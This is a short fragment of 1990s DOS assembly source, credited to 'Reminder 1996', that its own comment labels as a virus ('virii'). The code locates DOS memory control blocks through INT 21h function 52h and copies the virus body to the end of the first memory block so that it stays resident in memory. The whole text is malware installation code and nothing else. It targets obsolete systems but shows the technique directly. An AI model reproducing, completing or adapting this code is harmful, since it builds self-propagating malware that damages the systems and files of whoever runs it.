; (c) Reminder 1996
; Set body of virii 2 end of 1 mcb		

push cs cs
pop ds es

mov ah,52h
int 21h
mov ax,es:[bx-2]
mov es,ax
add ax,es:[3]
inc ax
sub ax,(mainlen+15)/16
sub ax,10h		; 100
mov es,ax
mov di,100h

mov cx,mainlen
mov si,offset start
cld
rep movsb
